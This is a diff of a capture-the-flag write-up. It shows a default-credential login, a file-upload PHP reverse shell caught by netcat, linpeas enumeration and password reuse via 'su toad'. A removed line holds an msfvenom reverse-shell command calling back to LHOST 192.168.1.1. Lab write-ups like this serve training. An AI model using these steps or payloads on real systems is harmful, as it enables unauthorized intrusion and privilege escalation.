@@ -20,18 +20,17 @@ As you can see from the image above, Wappalyzer shows that this server is runnin
 I saw online that the default username for the admin is `admin.` So I tried with `admin:password`, and it worked, lol. Now I can exploit a vulnerability that i found [here](https://hackerone.com/reports/768322). Follow the steps provided in this guide:<br />
 Add .php in the allowed file types: <br />
 ![image](https://github.com/user-attachments/assets/76e8c642-45ab-4bfe-96d1-62cfbf2efb84)<br />
-Now generate a php revershe shell with msfvenom: `msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=1234 > shell.php`.<br />
+Now generate a php revershe shell. Personally I used the one from PentestMonkey, provided in the `rev.php` file of this repo.<br />
 Now upload it:<br />
 ![image](https://github.com/user-attachments/assets/6cdf3097-1912-47c2-b9fc-abd5deb962e4)<br />
 Now open a netcat listener and click on the created link: <br />
 ![image](https://github.com/user-attachments/assets/7b301926-ee80-436e-87b7-0b8199e01bc6)<br />
-Nice:<br />
-![image](https://github.com/user-attachments/assets/7340f0ee-89cf-46b4-96c2-62d18e7381c0)<br />
-
-
-
-
-
+Nice(flags are at the end of this writeup): <br />
+![image](https://github.com/user-attachments/assets/6a12bc38-e10b-4c66-8dd5-59d161122344)<br />
+Now [stabilize the shell](https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal) so that you can keep you mental sanity. 
+Next, I run linpeas.sh on the target system to check any privesc paths. First thing I noticed is that /bin/cat has the SUID bit set, but I wasn't able to exploit it. Next, I found credentials for a mysql DB running on the target machine: <br />
+![image](https://github.com/user-attachments/assets/c8c7a145-edeb-4acd-afe7-3cf3baec3c5a)<br />
+To log inside the DB, the command is `mysql -u toad -p -h localhost`, and then input the discovered password. However, before logging in the DB, I wanted to try if that password also worked for toad's accout, so I run `su toad`, provided the password, and it worked: <br />
 
 
 - What is user.txt?
